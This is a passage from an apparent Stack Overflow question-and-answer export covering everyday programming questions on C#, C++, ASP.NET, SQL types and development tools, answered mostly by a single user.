<p>Since it is on Linux, and will be working with C++ code on the CentOS 32-bit OS, I am hoping here is a preferred OpenSource solution.  So, I guess I asking for the preferred OpenSource IDE for C++ code on CentOS Linux.  </p>

<p>Thanks for any insight and suggestions.</p>
","33708","","<ul>
<li>Eclipse </li>
<li>NetBeans</li>
<li>KDevelop</li>
</ul>
"
"<p>I just came across an interesting scenario. I have a class in C#:</p>

<pre><code>public class Test
{
  public int A;
  public int a;
}
</code></pre>

<p>As C# is case sensitive, this will treat the two variables <code>A</code> and <code>a</code> as distinct. I want to inherit the above class in my VB code, which is not case sensitive. How will the VB code access the two distinct variables <code>A</code> and <code>a</code>?</p>

<p>Any help is appreciated.</p>
","33708","","<p>The common language specification (CLS) which ensures cross language compatibility tells you not to declare two public members that are only different in case. Such a code won't be CLS compliant.</p>

<p>If you can't change the code of the library, you can use reflection API to manually select the field you want:</p>

<pre><code>obj.GetType().GetField(""a"").GetValue(obj)
obj.GetType().GetField(""A"").GetValue(obj)
</code></pre>
"
"<p>Is there a lint-like tool for C#?  I've got the compiler to flag warnings-as-errors, and I've got Stylecop, but these only catch the most egregious errors.  Are there any other must-have tools (especially for newbie C#ers like me) that point out probably-dumb things I'm doing?</p>
","33708","","<p>Tried <a href=""http://msdn.microsoft.com/en-us/library/bb429476.aspx"">FxCop</a>? It's integrated into VS as ""Code Analysis""</p>
"
"<p>I'm reading about Type Equivalence in my Programming Languages class and I've come across a situation in C I'm unsure about.</p>

<p>It describes C's ""Type Equivalence"" as: </p>

<blockquote>
  <p>C uses a form of type equivalence that falls between name and structural equivalence, and which can be loosely described as ""name equivalence for structs and unions, structural equivalence for everything else.""</p>
</blockquote>

<p>So what if I have two arrays of different size, but the same base type:</p>

<pre><code>typedef int A1[10];  
typedef int A2[20];
</code></pre>

<p>Since all I need is structural equivalence, could these two be considered structurally equivalent?  In C, is the size of the index set part of an array type or no?</p>
","33708","","<p>No they are not.</p>

<p>You can try <code>sizeof(A1)</code> and <code>sizeof(A2)</code> and see that they are different.</p>
"
"<p>My question arises from the post <a href=""http://stackoverflow.com/questions/487258/plain-english-explanation-of-big-o"">""Plain English Explanation of Big O""</a>. I don't know the exact meaning for logarithmic complexity. I know that I can make a regression between the time and the number of operations and calculate the X-squared value, and determine so the complexity. However, I want to know a method to determine it quickly on paper.</p>

<p>How do you determine logarithmic complexity? Are there some good benchmarks?</p>
","33708","","<p><a href=""http://en.wikipedia.org/wiki/Master%5Ftheorem"" rel=""nofollow"" rel=""nofollow"">Master theorem</a> usually works.</p>
"
"<p>I am trying to use some socket network programming in C++. I am trying to send the text ""Hello World!"" to a server using the C++ send() function. At first, I set the buffer to the size of 13 since ""Hello World!"" altogether is 12 characters (you have to make it one more than the character count). The send function only sends the characters to the server if I send it about 7 times. And when it does finally come to the server it looks like this:</p>

<p>""Hello World! Hello World! Hello World! Hello World! Hello World! Hello World! Hello World!""</p>

<p>Now here is the funny part. The ""Hello World!"" sentence sends immediately if I set the buffer size to 256 (char buffer[256];). When it comes to the server like that though, it shows ""Hello World!"" with a whole bunch of space after the two words. Why is this happening and if possible, how can I fix it? Please let me know.</p>

<p>Thanks</p>
","33708","","<p>When you call <code>read</code> (or <code>receive</code>) with your buffer to read from the socket, an integer value is returned that specifies the number of bytes read. You should only take that much from the buffer. The rest is irrelevant:</p>

<pre><code>int count = read(...);
// buffer[0 .. count - 1] contains the appropriate data.
</code></pre>
"
"<p>I hear a lot about subtyping tables when designing a database, and I'm fully aware of the theory behind them. However, I have never actually seen table subtyping in action. How can you create subtypes of tables? I am using MS Access, and I'm looking for a way of doing it in SQL as well as through the GUI (Access 2003).</p>

<p>Cheers!</p>
","33708","","<p>Subtypes of tables is a conceptual thing in EER diagrams. I haven't seen an RDBMS (excluding object-relational DBMSs) that supports it directly. They are usually implemented in either</p>

<ol>
<li>A set of nullable columns for each property of the subtype in a single table</li>
<li>With a table for base type properties and some other tables with at most one row per base table that will contain subtype properties</li>
</ol>
"
"<p>I would like to look at the code for some of the classes in the .NET library.  I find functions by using intellisense and just reading the tooltips that come up when I select different items.</p>

<p>One example is the Contains method that you can use on arrays to search for a given string.  I just happened to stumble upon that while working on an exercise to learn.  I'm assuming it's a simple method that just iterates through the array and checks for the string at each element.</p>

<p>If I wanted to take a look at this code, or code for any other class in .NET, how would I go about it?  I have Visual Studio 2008.</p>
","33708","","<p>Reflector is the way to go.</p>

<p>.NET Framework 3.5 BCL source code is available through debug symbols (reference license).</p>

<p>SSCLI (Rotor) and Mono source code can be relevant too.</p>
"
"<p>During code review I discovered many places of our C# code that looks like this:</p>

<pre><code>if(IsValid()) {
     return true;
}
else {
     return false;
}
</code></pre>

<p>or even ""better"":</p>

<pre><code>return (IsValid()? true : false);
</code></pre>

<p>I always wondered why not just write the code like this:</p>

<pre><code>return IsValid();
</code></pre>

<p>This is the way I would write this code. I ain't questioning the skills of the developers, but maybe trying to look into the developer's soul. Why would a developer favor more complex code and not a more simple and intuitive? Or maybe the reason is that it is hard to accept the Boolean type as the first-class citizen?</p>
","33708","","<p>I think <code>return IsValid();</code> is perfectly valid and readable code.</p>

<p>BTW, I would certainly slap anyone who writes (<code>IsValid() ? true : false</code>) in the face. It's unnecessarily complicated.</p>

<p>PS. This is what <code>svn blame</code> is designed for.</p>
"
"<p>As a dev team, we're looking to switch to asp.net MVC and I've heard rumors about IIS 6 not being able to support all of the MVC functionality.  Is this true?  Is there any official set of functionality supported in IIS 7 vs IIS 6?  Should we completely avoid running it on IIS6?</p>
","33708","","<p>I think the issue with IIS6 is extensionless URLs that you can easily achieve by adding a wildcard ISAPI map in IIS configuration.</p>

<p>So, no. While I love IIS7 integrated mode and strongly recommend using it, you won't lose functionality using it. I've deployed several ASP.NET MVC 1.0 projects on Windows Server 2003/IIS6.</p>
"
"<p>I've got a class with a bunch of [ColumnName(""foo"")] NHibernate attributes.
Is there an easy way to ask NHibernate to list all of the ColumnNames for a given class?</p>

<p>It sounds like it should be really easy but I'm just not seeing any kind of inspection in the NHibernate docs (or maybe I'm just blind today).</p>
","33708","","<p>Use LINQ and reflection:</p>

<pre><code>var columns = typeof(TheClass).GetProperties()
    .Where(property =&gt; property.GetCustomAttributes(typeof(ColumnNameAttribute), false).Count &gt; 0)
    .Select(property =&gt; property.Name);
</code></pre>
"
"<p>If a user clicks on a button that does a post (lets say it has UserName and Password in the post) and those credentials get authenticated successfully.  If I did a redirect to a completely different application (so I can't carry session, etc) and I use a GET with the Username and Password in the querystring (I could even use basic encryption if that helps but regardless) and then when it gets to the page, I check to make sure it came from the page I expected it to come from, pull the values from the querystring, put them in a session variable and then do a redirect back to the same page (removing the querystring values so they can't be viewed by user).  This all happens over SSL on the same server.</p>

<p>Can someone point out the security holes of someone intercepting the UserName and Password in this scenario?</p>
","33708","","<p>If you are using SSL, noone can intercept the request. The problem is actually with the client itself. It's not really a good idea to put username and passwords in a GET request (even encrypted), because:</p>

<ol>
<li>URL can be easily copied and pasted to someone else.</li>
<li>If a user clicks an outside link, the URL will be sent as the referrer.</li>
<li>XSS attacks can be used to hijack the URL.</li>
</ol>
"
"<p>I have tried multiple ways of grabbing the username of a current logged on user in vb.net/asp.net.  I am running it on IIS 6 and understand that it will return NETWORK SERVICE for the username.  I need to grab the username of the actual windows box log on.</p>

<p>I have tried the following code: Returns NT AUTHORITY\NETWORK SERVICE</p>

<pre><code>Dim User = System.Security.Principal.WindowsIdentity.GetCurrent.User
Dim UserName = User.Translate(GetType(System.Security.Principal.NTAccount)).Value
</code></pre>

<p>Any help will be greatly appreciated.  If I am unclear please let me know.</p>
","33708","","<p>You should set </p>

<pre><code> &lt;authentication mode=""Windows"" /&gt;
 &lt;identity impersonate=""true"" /&gt;
</code></pre>

<p>in <code>Web.config</code> to be able to do that.</p>
"
"<p>I have class where the relevant part looks like</p>

<pre><code>class C {
    void Method&lt;T&gt;(SomeClass&lt;T&gt; obj) {
        list.Add(obj);
    }
    List&lt;?&gt; list = new List&lt;?&gt;();
}
</code></pre>

<p>How should I define the list so that the class compiles?</p>

<p>I want a list of type <code>List&lt;SomeClass&lt;?&gt;&gt;</code>, that is a list of objects of <code>SomeClass</code> where each object can have any type parameter. The Java <code>?</code> construct allows this; what is the C# equivalent? If no such thing exists, is there a suitable workaround? (A <code>List&lt;object&gt;</code> would do but is terribly ugly.)</p>
","33708","","<p>Unfortunately, there is no direct equivalent in C# 3.0 as generics are invariant.
You'll be able to do something like this in a graceful manner using C# 4.0 safe co/contra-variance feature.
To workaround it, you could inherit <code>SomeClass&lt;T&gt;</code> from a nongeneric base and create a <code>List&lt;BaseClass&gt;</code> instead. 
If each instance of the class should hold only one type, you could make the class itself generic and set the type parameter there.</p>
"
"<p>If I know an index will have unique values, how will it affect performance on inserts or selects if I declare it as such. </p>

<p>If the optimiser knows the index is unique how will that affect the query plan?</p>

<p>I understand that specifying uniquenes can serve to preserve integrity, but leaving that discussion aside for the moment, what are the perfomance consequences.</p>
","33708","","<p>Of course the optimizer will take uniqueness in consideration. It affects the expected row count in query plans.</p>
"
"<p>I have just installed PMD to analyze my Java project. Really nice tool, highly recommended.
Anyways, I got a few errors saying: </p>

<blockquote>
  <p>""An empty method in an abstract class should be abstract instead""</p>
</blockquote>

<p>I checked out PMD documentation and the explanation says: </p>

<blockquote>
  <p>as developer may rely on this empty implementation rather than code the appropriate one</p>
</blockquote>

<p>So I think I understand the reason behind this code style error, but consider the following scenario: I have an abstract class called Entity. This class has a boolean method with default implementation. (controls whether to delete its related entities upon deletion). Only a few of the derived classes override this default behavior to true.</p>

<p>Should I remove the default implementation and force all deriving classes to declare their behavior? 
Do you really think this pattern is such a bad practice?</p>

<p><strong>Clarification:</strong> PMD treats a method with single return statement as empty.</p>
","33708","","<p>I think it's just a guideline. It tells you so that you might want to reconsider your design, but if your design already makes perfect sense, there's no reason to obey a software instead of your brain.</p>
"
"<p>What does the N in varchar(N) refer to when describing a field in a database. Is it the number of characters or bytes. Also, one is using UTF-8, a character may use more than one byte.</p>
","33708","","<p>It's the maximum number of characters.</p>

<p><code>nvarchar(1000)</code> = max 1000 unicode chars. </p>
"
"<p>I want to add login for registered users in my website. How shall I proceed with it? Is it through the use of sessions? What will happen to the Session variable once the logout happens??</p>
","33708","","<p>You should use the provided <code>Login</code> control and <code>Membership</code> system.</p>

<p>About Session vars, nothing special will happen. ASP.NET forms authentication does not use SessionState by default.</p>
"
"<p>I was goint through k &amp; r. I was having problem in understanding following lines on page 197(section A6)</p>

<blockquote>
  <p>Integral conversions: any integer is
  converted to a given unsigned type by
  finding the smallest non negative
  value that is congruent to that
  integer,modulo one more than the
  largest value that can be represented
  in the unsigned type.</p>
</blockquote>

<p>Can any body explain this in a bit detail.
Thanks</p>
","33708","","<p>It means only low value bits will be count and high order bits will be discarded.</p>

<p>For example:</p>

<pre><code>01111111 11111111 11110000 00001111
</code></pre>

<p>when converted to a 16 bit <code>unsigned short</code> will be: </p>

<pre><code>11110000 00001111
</code></pre>

<p>This is effectively mathematically expressed in:</p>

<pre><code>target_value = value % (target_type_max+1)           ( % = modulus operator )
</code></pre>
"
"<p>Autonumber fields (e.g. ""identity"" in SQL Server) are a common method for providing a unique key for a database table.  However, given that they are quite common, <em>at some point</em> in the future we'll be dealing with the problem where they will start reaching their maximum value.</p>

<p>Does anyone know of or have a recommended strategy to avoid this scenario?  I expect that many answers will suggest switching to guids, but given that this will take large amount of development (especially where many systems are integrated and share the value) is there another way?  Are we heading in a direction where newer hardware/operating systems/databases will simply allow larger and larger values for integers?</p>
","33708","","<p>If you really expect your IDs to run out, use <code>bigint</code>. For most practical purposes, it won't ever run out, and if it does, you should probably use a <code>uniqueidentifier</code>.</p>

<p>If you have <strong>3 billion</strong> (that means a transaction/cycle on a 3.0GHz processor) transactions per second, it'll take about a century for <code>bigint</code> to run out (even if you put off a bit for the sign).</p>

<p>That said, once, ""<em><a href=""http://en.wikiquote.org/wiki/Bill%5FGates#Misattributed"" rel=""nofollow"">640K ought to be enough for anybody</a>.</em>"" :)</p>
"
"<p>I want to add an int into an array, but the problem is that I don't know what the index is now.</p>

<pre><code>int[] arr = new int[15];
arr[0] = 1;
arr[1] = 2;
arr[2] = 3;
arr[3] = 4;
arr[4] = 5;
</code></pre>

<p>That code works because I know what index I am assigning to, but what if I don't know the index...</p>

<p>In PHP, I can just do <code>arr[]=22;</code>, which will automatically add 22 to the next empty index of the array. But in C++ I can't do that, it gives me a compiler error. What do you guys suggest?</p>
","33708","","<p>Arrays in C++ cannot change size at runtime. For that purpose, you should use <code>vector&lt;int&gt;</code> instead.</p>

<pre><code>vector&lt;int&gt; arr;
arr.push_back(1);
arr.push_back(2);

// arr.size() will be the number of elements in the vector at the moment.
</code></pre>

<p>As mentioned in the comments, <code>vector</code> is defined in <code>vector</code> header and <code>std</code> namespace. To use it, you should:</p>

<p><code>#include &lt;vector&gt;</code></p>

<p>and also, either use <code>std::vector</code> in your code or add </p>

<pre><code>using std::vector;
</code></pre>

<p>or </p>

<pre><code>using namespace std;
</code></pre>

<p>after the <code>#include &lt;vector&gt;</code> line.</p>
"
"<p>Being new to ASP.NET MVC, I would like to know the easy method of paging. The data is IQueryable type.</p>
","33708","","<pre><code>var dataPage = data.Skip(pageNumber * pageSize - pageSize).Take(pageSize);
</code></pre>

<p>To learn the basic tricks of ASP.NET MVC, I suggest reading the free <a href=""http://aspnetmvcbook.s3.amazonaws.com/aspnetmvc-nerdinner%5Fv1.pdf"" rel=""nofollow"">Professional ASP.NET MVC 1.0 Book Chapter 1 by Scott Guthrie</a></p>
"
"<p>what is the difference between Data list and Grid view</p>
","33708","","<p><code>GridView</code> has much more bells and whistles than <code>DataList</code>. The very basic difference is that you should write your own templates to use a <code>DataList</code>. <code>GridView</code> automatically provides you with a tabular data template and much more functionality out of the box. The rule of thumb is, use <code>GridView</code> when it's what you need. Use <code>DataList</code>, <code>Repeater</code> and other more customizable controls when you're willing to customize them more radically.</p>
"
"<p>Given a generic class definition like </p>

<pre><code>public class ConstrainedNumber&lt;T&gt; :
    IEquatable&lt;ConstrainedNumber&lt;T&gt;&gt;,
    IEquatable&lt;T&gt;,
    IComparable&lt;ConstrainedNumber&lt;T&gt;&gt;,
    IComparable&lt;T&gt;,
    IComparable where T:struct, IComparable, IComparable&lt;T&gt;, IEquatable&lt;T&gt;
</code></pre>

<p>How can I define arithmetic operators for it?</p>

<p>The following does not compile, because the '+' operator cannot be applied to types 'T' and 'T':</p>

<pre><code>public static T operator +( ConstrainedNumber&lt;T&gt; x, ConstrainedNumber&lt;T&gt; y)
{
    return x._value + y._value;
}
</code></pre>

<p>The generic type 'T' is constrained with the 'where' keyword as you can see, but I need a constraint for number types that have arithmetic operators (IArithmetic?).</p>

<p>'T' will be a primitive number type such as int, float, etc.  Is there a 'where' constraint for such types?</p>
","33708","","<p>Unfortunately, this is not possible as there is not an <code>IArithmetic</code> (as you said) interface defined for integers. You can wrap those primitive types in classes that do implement such an interface.</p>
"
"<p>I am looking for an efficient way to determine the position of the least significant bit that is set in an integer, e.g. for 0x0FF0 it would be 4. </p>

<p>A trivial implementation is this:</p>

<pre><code>unsigned GetLowestBitPos(unsigned value)
{
   assert(value != 0); // handled separately

   unsigned pos = 0;
   while (!(value &amp; 1))
   {
      value &gt;&gt;= 1;
      ++pos;
   }
   return pos;
}
</code></pre>

<p>Any ideas how to squeeze some cycles out of it?</p>

<p>(Note: this question is for people that enjoy such things, not for people to tell me xyzoptimization is evil.)</p>

<p><strong>[edit]</strong>  Thanks everyone for the ideas! I've learnt a few other things, too. Cool!</p>
","33708","","<p>There is an x86 assembly instruction (<code>bsf</code>) that will do it. :)</p>

<p>More optimized?!</p>

<h2>Side Note:</h2>

<p>Optimization at this level is inherently architecture dependent. Today's processors are <em>too complex</em> (in terms of branch prediction, cache misses, pipelining) that it's so hard to predict which code is executed faster on which architecture. Decreasing operations from 32 to 9 or things like that might even decrease the performance on some architectures. Optimized code on a single architecture might result in worse code in the other. I think you'd either optimize this for a specific CPU or leave it as it is and let the compiler to choose what it thinks it's better.</p>
"
"<p>I'm using a library that generates a bunch of classes for me.</p>

<p>These classes all inherit from a common base class but that base class doesn't define a couple methods that are common to all subclasses.</p>

<p>For example:</p>

<pre><code>SubClassA : BaseClass{
  void Add(ItemA item) {...}
  ItemA CreateNewItem() {...}
}

SubClassB: BaseClass{
  void Add(ItemB item) {...}
  ItemB CreateNewItem() {...}
}
</code></pre>

<p>Unfortunately, the base class <strong>doesn't have these methods</strong>. This would be great:</p>

<pre><code>BaseClass{
  // these aren't actually here, I'm just showing what's missing:
  abstract void Add(ItemBaseClass item);  // not present!
  abstract ItemBaseClass CreateNewItem(); // not present!
}
</code></pre>

<p>Since there is a common base class for my  A+B objects and a common base class for the Item objects, I had hoped to benefit from the wonderful world of polymorphism.</p>

<p>Unfortunately, since the common methods aren't actually present in the base class, I can't call them virtually. e.g., this would be perfect:</p>

<pre><code>BaseClass Obj;
Obj = GetWorkUnit(); // could be SubClassA or SubClassB

ItemBaseClass Item = Obj.CreateNewItem(); // Compile Fail: CreateNewItem() isn't in the base class

Item.DoSomething();

Obj.Add(Item); // Compile Fail: Add(...) isn't in the base class
</code></pre>

<p>Obviously casting would work but then I'd need to know which type I had which would negate the benefits.</p>

<p>How can I ""force"" a call to these methods? I'm not worried about getting an object that doesn't implement the method I'm trying to call. I can actually do what I want in VB--I don't get intellisense but the compiler's happy and it works:</p>

<pre><code>CType(Obj, Object).Add(Item) // Note: I'm using C#--NOT VB
</code></pre>

<p>Againt, I have no control over these classes (which I think rules out partial classes).</p>
","33708","","<p>You cannot call a non-virtual method of a derived class without resorting to reflection or other dirty tricks. If you want to do it, it's easy then:</p>

<pre><code>// obj is your object reference.
obj.GetType().InvokeMember(""MethodName"", 
    System.Reflection.BindingFlags.InvokeMethod, null, obj, null /* args */)
</code></pre>
"
"<p>I keep track of the current logged in userID and base the behavior of my site on this value. My code sets the logged in user ID with this statement:</p>

<pre><code>FormsAuthentication.SetAuthCookie(UserID.ToString(), true);
</code></pre>

<p>Subsequently, I read this value <code>from Page.User.Identity.Name</code>.</p>

<p>This works fine on my desktop, but on my server, I set it to 8 and it comes back 20. I am trying to figure out what can set Page.User.Identity.Name to a value and when this happens.</p>

<p>Thanks...</p>
","33708","","<p><code>FormsAuthenticationModule</code> handles <code>Application_OnAuthenticate</code> and assigns the <code>HttpContext.User</code> to a prinicipal object which is in turn used by <code>Page.User.Identity.Name</code>.</p>

<p>Isn't there a time difference issue on the server and your desktop?</p>
"
"<p>I have a customer who is being dogged pretty hard by SOX auditors regarding the deployment practices of our ASP.NET applications. Care is taken to be sure to use appropriate file- and folder-level security and authorization. Only those few with deployment privileges can copy an up to the product server (typically done using secure FTP).</p>

<p>However, the file/folder-level security and the requirement of secure FTP isn't enough for the bean counters. They want system logs of who deployed what when, what version replaced what version (and why), and generally lots of other minutiae designed to keep the business from being Office Spaced (the bean counters apparently want the rounded cents all to themselves).  </p>

<p>What are your suggestions for making the auditors happy? We don't mind throwing some dollars at this (in fact, I think we would probably throw big dollars at a good enough solution). </p>
","33708","","<p>You might want to take a look at the auditing features provided by NTFS.</p>
"
"<p>I know how to create a list of Controls and add new instances of them to it:</p>

<pre><code>private List&lt;FirstCircleControl&gt; Circles = new List&lt;FirstCircleControl&gt;();
FirstCircleControl mc = new FirstCircleControl();
Circles.Add(mc);
</code></pre>

<p>I want to add a whole bunch of ""FirstCircleControls"".  How would I add 10 controls to my list?  I want to be able to ""create"" and then ""add"" them to the list using a loop.</p>
","33708","","<p>I wonder why you might need to create them all at once and then add them to the list, but here's a solution:</p>

<pre><code>Enumerable.Range(0, 10)
          .Select(x =&gt; new FirstCircleControl())
          .ToList()                        // Forces creation of controls.
          .ForEach(x =&gt; Circles.Add(x));   // Adds them to the list.
</code></pre>
"
"<p>I've just started to learn about Asp.Net 3.5 compilation model, but most articles mostly talk about Asp.Net 2.0 compilation model and how it differs from previous versions of ASP.NET compilation model. So I wasn't able to find any article explaining if there are any differences between ASP.NET 2.0 and ASP.NET 3.5 compilation models. Thus:</p>

<p>A) do CodeBehind,Src, CodeFile and Inherits attributes act  exactly the same in both ASP.NET 2.0 and ASP.NET 3.5?</p>

<p>B) where do Asp.Net 2.0 and Asp.Net 3.5 compilation models differ?</p>
","33708","","<p>The compilation system is not redesigned in ASP.NET 3.5. It's the same system as of 2.0.</p>
"
"<p>I'm reading in an image (jpg) using the code below and I need to check that the image is no bigger than 150 pixels by 150 pixels and is less than 25k, how should I do this?</p>

<pre><code>PictureBox2.Image = Image.FromFile(.FileName)
</code></pre>

<p>Thanks</p>
","33708","","<pre><code>If New FileInfo(.FileName).Length &gt; 25 * 1024 Then ... 'More than 25KB'
Dim img = Image.FromFile(.FileName)
If img.Size.Width &gt; 150 OrElse img.Size.Height &gt; 150 Then ... 'More than 150x150'
Picturebox1.Image = img
</code></pre>
"
"<p>I want to execute dynamically created string in C#. I know VB and JScript.Net can do it, and there is even a <a href=""http://odetocode.com/Code/80.aspx"">way</a> to use its assembly in C# as a workaround. I also found this <a href=""http://www.ziggyware.com/readarticle.php?article%5Fid=98"">article</a> describing how to do it.</p>

<p>I read today about C# 4.0 features which bring it closer to the dynamic languages that have this as one of the main features. So, does anybody know does C# 4.0 includes some built in features that allows for string execution, or any other way to do whats desrbied in the article above.</p>

<p>Thanks.</p>
","33708","","<p>This has not much to do with <code>dynamic</code> features of C# 4.0. Rather, the enhancements of the managed compiler and exposing its data structures to managed code makes it so easy.</p>
"
"<p>I'd like to construct an object in different steps in an asp.net mvc application, each step being a different page. The sort of thing you'd store in Session in a quick Web.Forms application.</p>

<p>Reading about it, Session doesn't seem to me as something very asp.net MVC'ish. However I can't really think of other alternatives to this situation as TempData and ViewData don't seem to fit either, so maybe I'm wrong.</p>

<p>Of course I could put the 4 steps in one page and show/hide, but that's not my point with the question. I'd like to hear your opinion about Session in MVC, if it's a good aproach for this kind of multi-step problem or you tend to do it in other ways.</p>

<p>This is very much like question <a href=""http://stackoverflow.com/questions/560084/session-variables-in-asp-net-mvc"">Session variables in ASP.NET MVC</a>, except that I'm not looking for how to access Session, but if it's the best way to solve such a problem or there is something better I'm missing in Asp.Net MVC.</p>

<p>Thanks in advance</p>
","33708","","<p>Have you tried <code>&lt;%= Html.HiddenField(...) %&gt;</code>?</p>
"
"<p>So what I'm trying to do is call a single propertyWasSet() function when any property within a C# class is set (conversely, propertyWasGot() when it is get). I would also like to know which property's 'get' was invoked.</p>

<p>I would like to maintain a dictonary of properties that are 'set', and check upon the 'get' action if they have been set yet (and throw an error if it hasn't been).</p>

<p>I've be looking through msdn documentation for reflection, delegates, etc..., but I'm not entirely sure this is possible.</p>

<p>Is there a way to do this? or fire an event upon calling one of these functions that can be intercepted in a base class or something?</p>
","33708","","<p>I think what you need is very similar to WPF dependency property system. You might want to look at its implementation. Anyhow, you can add the intercepting code to getter and setter of each property too.</p>
"
"<p>I have a DataGridView in a Windows Form. I want to handle double click events on each cell to display a detail form related to that record. Unfortunately, the double click event is executed when you double click on column headers. What should I do?</p>
","33708","","<p>You should check the <code>RowIndex</code> and <code>ColumnIndex</code> property of the event arguments. If one of them is negative, it means that either a row header or a column header is clicked, you should ignore that event.</p>
"
"<p>I feel the term rather pejorative. Hence, I am flabbergasted by the two sentences in Wikipedia:</p>

<blockquote>
  <p>Imperative programming is known for
  employing side effects to make
  programs function. Functional
  programming in turn is known for its
  minimization of side effects. <a href=""http://en.wikipedia.org/wiki/Side_effect_(computer_science)""> [1] </a></p>
</blockquote>

<p>Since I am somewhat Math-biased, the latter sounds excellent. What are the arguments for side-effects? Do they mean the loss of control or the acceptance of uncertainty? Are they a good thing?</p>
","33708","","<p>In von-Neumann machines, side effects are things that make the machine work. Essentially, no matter how you write your program, it'll need to do side-effects to work (at a low level view). </p>

<p>Programming without side effects means abstracting side effects away so that you could think about the problem in general -without worrying about the current state of the machine- and reduce dependencies across different modules of a program (be it procedures, classes or whatever else). By doing so, you'll make your program more reusable (as modules do not depend on a particular state to work). </p>

<p>So yes, side-effect free programs are a good thing but side-effects are just inevitable at some level (so they cannot be considered as ""bad"").</p>
"
"<p>I'm writing a merge sort function, and right now I am just using a test case array (there is no input - this is static, for now). I don't know how to pass an array as an argument. Here is my code right now:</p>

<pre><code>//merge sort first attempt

#include &lt;iostream&gt;
#include &lt;algorithm&gt;
#include &lt;vector&gt;

int mergeSort(int[]);
int main()
{
int originalarray[] = {1, 3, 5, 7, 9, 2, 4, 6, 8, 10};
mergeSort(originalarray[]);
}

int mergeSort(int[] originalarray)
{
int num = (sizeof(originalarray)/sizeof(int));
std::vector&lt;int&gt; original(num);

if (num &gt; 2) {
    return num;
}

// Fill the array using the elements of originalarray
// This is just for demonstration, normally original will be a parameter,
// so you won't be filling it up with anything.
std::copy(originalarray, originalarray + num, original.begin());

// Create farray and sarray of the appropriate size
std::vector&lt;int&gt; farray(num / 2);
std::vector&lt;int&gt; sarray(num - farray.size());

// Fill those using elements from original
std::copy(original.begin(), original.begin() + farray.size(), farray.begin());
std::copy(original.begin() + farray.size(), original.end(), sarray.begin());

mergeSort(farray);
mergeSort(sarray);
</code></pre>

<p>}</p>

<p>Note that this mergeSort function is not functional, as I have not figured out how to merge them yet (that's my assignment). I would like to get my two vectors sorted before I deal with that, and I can't compile this because of my need to pass an array as an argument. I don't understand pointers, so if that is the solution, my excuse is ignorance. I'm learning programming right now, with C++ as a first language, and only have a basic grasp of the language's features. Thanks for the help.</p>
","33708","","<p>You should not use <code>sizeof(originalarray)/sizeof(int)</code> like that. It'll only work for statically declared arrays (the size is known at compile time). You have to pass the size along with it. Why don't you just make a <code>vector</code> out of the array and pass it instead?</p>

<p><em>Side Note:</em> As a rule of thumb, always note that <code>sizeof</code> will be translated at compile time. So there's no way it could know the size of the array passed as an argument.</p>
"
"<p>While I can upcast a string to an object, I cannot upcast an IList of strings to an IList of objects. How come? What to do now other that coping all items to a new IList?</p>

<pre><code>static void ThisWorks()
{
     IList&lt;object&gt; list = new List&lt;object&gt;();
     list.Add(""I can add a string since string : object"");
}

static void ThisDoesNotWork()
{
     // throws an invalid cast exception
     IList&lt;object&gt; list = (IList&lt;object&gt;) new List&lt;string&gt;(); 

     list.Add(""I'm never getting here ... why?"");
}
</code></pre>
","33708","","<p>This is not possible as generics are invariant (as of C# 3.0).</p>

<p>You can workaround it with:</p>

<pre><code>var objectList = list.Cast&lt;object&gt;().ToList();
</code></pre>
"
"<p>Looking to make a really simple random number generator method in C. The numbers should be between 0 and 24 and can be for example 14.5f.</p>

<p>Any help would be great, thanks!</p>
","33708","","<pre><code>float getRand() {
  float rnd = rand();
  rnd /= RAND_MAX;
  return rnd * 24.0f;
}
</code></pre>

<p>Make sure you seed the random number generator with <code>srand</code> before use.</p>
"
"<p>The only sample ASP.NET MVC projects I know about are the following from <a href=""http://asp.net/mvc"" rel=""nofollow"">http://asp.net/mvc</a>.  Are there others?</p>

<ul>
<li><a href=""http://www.codeplex.com/nerddinner"" rel=""nofollow"">Nerddinner.com</a></li>
<li><a href=""http://prodinner.codeplex.com"" rel=""nofollow"">ProDinner</a></li>
<li><a href=""http://www.asp.net/learn/mvc/tutorial-26-cs.aspx"" rel=""nofollow"">Stephen Walther's Contact Manager</a></li>
<li><a href=""http://blog.wekeroad.com/mvc-storefront/"" rel=""nofollow"">Rob Conery's MVC Storefront</a></li>
<li><a href=""http://code.google.com/p/codecampserver/"" rel=""nofollow"">CodeCampServer</a></li>
<li><a href=""http://code.google.com/p/sutekishop/"" rel=""nofollow"">Suteki Shop E-Commerce Application</a></li>
<li><a href=""http://www.asp.net/learn/mvc-videos/video-395.aspx"" rel=""nofollow"">Stephen Walther's Movie Database</a></li>
</ul>
","33708","","<p><a href=""http://oxite.codeplex.com/"" rel=""nofollow"">Oxite</a></p>
"
"<p>I want to check which CPU architecture is the user running, is it
i386 or X64 or AMD64. I want to do it in C#.
I know i can try WMI or Registry. Is there any other way apart from these two?
My project targets .NET 2.0!</p>
","33708","","<p>You could also try (only works if it's not manipulated):</p>

<pre><code>System.Environment.GetEnvironmentVariable(""PROCESSOR_ARCHITECTURE"")
</code></pre>
"
"<p>I want to know the amount concurrent sessions at a given time. But with spiders and load-balancers and perhaps influences that do not know about, how safe is it to do this in global asax:</p>

<pre><code>void Session_Start(object sender, EventArgs e)
{
  counter++;
}

void Session_End(object sender, EventArgs e)
{
  counter--;
}
</code></pre>

<p>Any tips?</p>
","33708","","<p>At very least, this solution has a threading problem (beside other problems that might affect you as you mentioned and I won't cover):</p>

<p>The increment and decrement task should be done in an atomic way using <a href=""http://msdn.microsoft.com/en-us/library/dd78zt0c(loband).aspx"" rel=""nofollow""><code>Interlocked.Increment</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/1z4b2e5y(loband).aspx"" rel=""nofollow""><code>Interlocked.Decrement</code></a> methods rather than <code>++</code> or <code>--</code>.</p>
"
"<p>Is there any way to tinker with the iPhone SDK on a Windows machine? Are there plans for an iPhone SDK version for Windows?</p>

<p>The only other way I can think of doing this is to run a Mac VM image on a <strong>VMWare</strong> server running on Windows, although I'm not too sure how legal this is.</p>
","33708","Mehrdad Afshari","<p>Of course, you can write Objective-C code in notepad or other programs and then move it to a Mac to compile.</p>

<p>But seriously, it depends on whether you are developing official applications to put in App Store or developing applications for jailbroken iPhone. To write official applications, Apple iPhone SDK which requires an Intel Mac seems to be the only practical way. However, there is an unofficial toolchain to write applications for jailbroken iPhones. You can run it on Linux and Windows (using Cygwin).</p>
"
"<p>I guess, the following is a standard problem on every school or university:</p>

<p>It is Your job to teach programming. Unfortunately, some of the students
are semi-professionals and have years of experience while others do not even know the basic concepts, e.g. the concept ""typed variable"".</p>

